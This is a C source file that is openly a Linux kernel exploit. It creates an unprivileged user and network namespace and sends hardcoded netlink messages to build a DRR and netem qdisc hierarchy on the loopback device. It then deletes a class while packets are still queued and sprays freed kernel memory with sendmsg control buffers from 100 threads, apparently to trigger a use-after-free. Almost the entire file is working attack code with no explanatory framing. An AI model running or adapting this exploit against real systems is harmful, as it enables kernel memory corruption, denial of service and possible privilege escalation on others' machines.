#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <net/if.h>
#include <pthread.h>
#include <sys/msg.h>
#include <sys/resource.h>

#define perror_exit(msg) do { perror(msg); exit(1); } while (0)

void set_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp, ret;
    char edit[0x100];
    ret = unshare(CLONE_NEWNET | CLONE_NEWUSER);
    if (ret < 0)
        perror_exit("unshare");
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

// ip link set lo up
unsigned char p1[] = {0x20,0x00,0x00,0x00,0x10,0x00,0x05,0x00,0x13,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00};
// tc qdisc add dev lo root handle 1: drr
unsigned char p2[] = {0x2c,0x00,0x00,0x00,0x24,0x00,0x05,0x06,0x14,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00};
// tc class add dev lo parent 1: classid 1:1 drr quantum 1500
unsigned char p3[] = {0x38,0x00,0x00,0x00,0x28,0x00,0x05,0x06,0x15,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00,0x0c,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0xdc,0x05,0x00,0x00};
// tc qdisc add dev lo parent 1:1 handle 2: drr
unsigned char p4[] = {0x2c,0x00,0x00,0x00,0x24,0x00,0x05,0x06,0x15,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00};
// tc class add dev lo parent 1: classid 1:2 drr quantum 1500
unsigned char p5[] = {0x38,0x00,0x00,0x00,0x28,0x00,0x05,0x06,0x15,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x02,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00,0x0c,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0xdc,0x05,0x00,0x00};
// tc qdisc add dev lo parent 1:2 handle 3: drr
unsigned char p6[] = {0x2c,0x00,0x00,0x00,0x24,0x00,0x05,0x06,0x15,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00};
// tc class add dev lo parent 3: classid 3:1 drr quantum 1500
unsigned char p7[] = {0x38,0x00,0x00,0x00,0x28,0x00,0x05,0x06,0x15,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x03,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00,0x0c,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0xdc,0x05,0x00,0x00};
// tc qdisc add dev lo parent 3:1 handle 4: netem delay 250ms limit 100
unsigned char p8[] = {0x58,0x00,0x00,0x00,0x24,0x00,0x05,0x06,0xd5,0x7f,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x01,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0x01,0x00,0x6e,0x65,0x74,0x65,0x6d,0x00,0x00,0x00,0x28,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x0a,0x00,0x80,0xb2,0xe6,0x0e,0x00,0x00,0x00,0x00};
// tc qdisc add dev lo parent 4: netem delay 1000s loss 100% limit 100
unsigned char p9[] = {0x58,0x00,0x00,0x00,0x24,0x00,0x05,0x06,0x16,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0x01,0x00,0x6e,0x65,0x74,0x65,0x6d,0x00,0x00,0x00,0x28,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x0a,0x00,0x00,0x10,0xa5,0xd4,0xe8,0x00,0x00,0x00};
// tc qdisc replace dev lo parent 1:1 handle 4:
unsigned char p10[] = {0x24,0x00,0x00,0x00,0x24,0x00,0x05,0x05,0x16,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00};
// tc qdisc replace dev lo parent 3:1 drr
unsigned char p11[] = {0x2c,0x00,0x00,0x00,0x24,0x00,0x05,0x05,0x16,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00};
// tc qdisc replace dev lo parent 3:1 handle 5: netem delay 1000s limit 100 # qlen == 1, in the active list
unsigned char p12[] = {0x58,0x00,0x00,0x00,0x24,0x00,0x05,0x05,0x16,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x00,0x01,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0x01,0x00,0x6e,0x65,0x74,0x65,0x6d,0x00,0x00,0x00,0x28,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x0a,0x00,0x00,0x10,0xa5,0xd4,0xe8,0x00,0x00,0x00};
// tc qdisc change dev lo parent 1:1 netem delay 1000s limit 100
unsigned char p13[] = {0x58,0x00,0x00,0x00,0x24,0x00,0x05,0x00,0x17,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0x01,0x00,0x6e,0x65,0x74,0x65,0x6d,0x00,0x00,0x00,0x28,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x0a,0x00,0x00,0x10,0xa5,0xd4,0xe8,0x00,0x00,0x00};
// tc filter add dev lo parent 1: prio 100 protocol ip handle 87 fw classid 1:2
unsigned char p14[] = {0x38,0x00,0x00,0x00,0x2c,0x00,0x05,0x06,0x17,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x57,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x64,0x00,0x07,0x00,0x01,0x00,0x66,0x77,0x00,0x00,0x0c,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0x02,0x00,0x01,0x00};
// tc filter add dev lo parent 3: prio 100 protocol ip handle 87 fw classid 3:1
unsigned char p15[] = {0x38,0x00,0x00,0x00,0x2c,0x00,0x05,0x06,0x17,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x57,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x08,0x00,0x64,0x00,0x07,0x00,0x01,0x00,0x66,0x77,0x00,0x00,0x0c,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0x01,0x00,0x03,0x00};
// tc filter del dev lo parent 3: prio 100 protocol ip handle 87 fw classid 3:1
unsigned char p16[] = {0x38,0x00,0x00,0x00,0x2d,0x00,0x05,0x00,0x17,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x57,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x08,0x00,0x64,0x00,0x07,0x00,0x01,0x00,0x66,0x77,0x00,0x00,0x0c,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0x01,0x00,0x03,0x00};
// tc filter del dev lo parent 1: prio 100 protocol ip handle 87 fw classid 1:2
unsigned char p17[] = {0x38,0x00,0x00,0x00,0x2d,0x00,0x05,0x00,0x17,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x57,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x64,0x00,0x07,0x00,0x01,0x00,0x66,0x77,0x00,0x00,0x0c,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0x02,0x00,0x01,0x00};
// tc class del dev lo parent 1: classid 1:1 drr quantum 1500
unsigned char p18[] = {0x38,0x00,0x00,0x00,0x29,0x00,0x05,0x00,0x1b,0x7d,0x6a,0x67,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x01,0x00,0x64,0x72,0x72,0x00,0x0c,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0xdc,0x05,0x00,0x00};

#define DRR_CLASS_SPRAY_THREADS 100

int cfd[2];
int sfd[DRR_CLASS_SPRAY_THREADS][2];
char payload[0x1000];
char buf[0x1000];

void *job(void *x)
{
    size_t idx = (size_t)x;
    write(cfd[0], buf, 1);
    read(cfd[0], buf, 1);
    set_cpu(0);

    struct iovec iov = { buf, 0x1000 };
    struct msghdr mhdr = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = 0x80};
    sendmsg(sfd[idx][1], &mhdr, 0);
    write(cfd[0], buf, 1);
}

void setup_spray()
{
    const int n = 0x800;
    int ret;

    memset(payload, 'A', sizeof(payload));
    socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
    
    for (int i = 0; i < DRR_CLASS_SPRAY_THREADS; i++) {
        ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, sfd[i]);
        if (ret == -1)
            perror_exit("socketpair AF_UNIX SOCK_DGRAM");

        setsockopt(sfd[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&n, sizeof(n));
        setsockopt(sfd[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&n, sizeof(n));
        write(sfd[i][1], buf, 0x1000);
    }

    pthread_t tid;
    for (int i = 0; i < DRR_CLASS_SPRAY_THREADS; i++)
        pthread_create(&tid, 0, job, (void*)(size_t)i);
    read(cfd[1], buf, DRR_CLASS_SPRAY_THREADS);
}

struct sockaddr_in udp_addr_dst;
int udp_sockfd;
void setup_udp_sockfd()
{
    int ret;
    
    const char *interface = "lo";

    udp_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sockfd == -1)
        perror_exit("Socket creation failed");

    ret = setsockopt(udp_sockfd, SOL_SOCKET, SO_BINDTODEVICE, interface, strlen(interface));
    if (ret == -1)
        perror_exit("Binding socket to device failed");

    int priority = 0x10001;
    setsockopt(udp_sockfd, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));

    memset(&udp_addr_dst, 0, sizeof(udp_addr_dst));
    udp_addr_dst.sin_family = AF_INET;
    udp_addr_dst.sin_port = htons(1234);
    inet_pton(AF_INET, "127.0.0.1", &udp_addr_dst.sin_addr);
}

void send_udp_pkt()
{
    if (sendto(udp_sockfd, "A", 1, 0, (struct sockaddr *)&udp_addr_dst, sizeof(udp_addr_dst)) < 0)
        perror_exit("Sendto failed");
}

int main()
{
    int nl_sockfd;
    int ret;
    
    struct rlimit rlim = {
        .rlim_cur = 0xf000,
        .rlim_max = 0xf000
    };
    setrlimit(RLIMIT_NOFILE, &rlim);
    setvbuf(stdout, 0, 2, 0);
    unshare_setup(getuid(), getgid());

    nl_sockfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (nl_sockfd == -1)
        perror_exit("socket netlink");
    
    setup_udp_sockfd();
    setup_spray();

    // === exploit start ===
    set_cpu(0);
    ret = write(nl_sockfd, p1, sizeof(p1));
    if (ret != sizeof(p1)) perror_exit("write p1 failed");
    ret = write(nl_sockfd, p2, sizeof(p2));
    if (ret != sizeof(p2)) perror_exit("write p2 failed");
    ret = write(nl_sockfd, p3, sizeof(p3));
    if (ret != sizeof(p3)) perror_exit("write p3 failed");
    ret = write(nl_sockfd, p4, sizeof(p4));
    if (ret != sizeof(p4)) perror_exit("write p4 failed");
    ret = write(nl_sockfd, p5, sizeof(p5));
    if (ret != sizeof(p5)) perror_exit("write p5 failed");
    ret = write(nl_sockfd, p6, sizeof(p6));
    if (ret != sizeof(p6)) perror_exit("write p6 failed");
    ret = write(nl_sockfd, p7, sizeof(p7));
    if (ret != sizeof(p7)) perror_exit("write p7 failed");
    ret = write(nl_sockfd, p8, sizeof(p8));
    if (ret != sizeof(p8)) perror_exit("write p8 failed");
    ret = write(nl_sockfd, p9, sizeof(p9));
    if (ret != sizeof(p9)) perror_exit("write p9 failed");
    ret = write(nl_sockfd, p10, sizeof(p10));
    if (ret != sizeof(p10)) perror_exit("write p10 failed");
    ret = write(nl_sockfd, p11, sizeof(p11));
    if (ret != sizeof(p11)) perror_exit("write p11 failed");
    ret = write(nl_sockfd, p12, sizeof(p12));
    if (ret != sizeof(p12)) perror_exit("write p12 failed");

    send_udp_pkt();

    ret = write(nl_sockfd, p13, sizeof(p13));
    if (ret != sizeof(p13)) perror_exit("write p13 failed");
    
    send_udp_pkt();
    
    ret = write(nl_sockfd, p14, sizeof(p14));
    if (ret != sizeof(p14)) perror_exit("write p14 failed");
    ret = write(nl_sockfd, p15, sizeof(p15));
    if (ret != sizeof(p15)) perror_exit("write p15 failed");

    int priority = 100;
    int mark = 87;
    setsockopt(udp_sockfd, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
    setsockopt(udp_sockfd, SOL_SOCKET, SO_MARK, &mark, sizeof(mark));
    send_udp_pkt();

    ret = write(nl_sockfd, p16, sizeof(p16));
    if (ret != sizeof(p16)) perror_exit("write p16 failed");
    ret = write(nl_sockfd, p17, sizeof(p17));
    if (ret != sizeof(p17)) perror_exit("write p17 failed");

    usleep(500000);

    ret = write(nl_sockfd, p18, sizeof(p18));
    if (ret != sizeof(p18)) perror_exit("write p18 failed");

    write(cfd[1], buf, DRR_CLASS_SPRAY_THREADS);
    read(cfd[1], buf, DRR_CLASS_SPRAY_THREADS);
    
    send_udp_pkt();

    return 0;
}

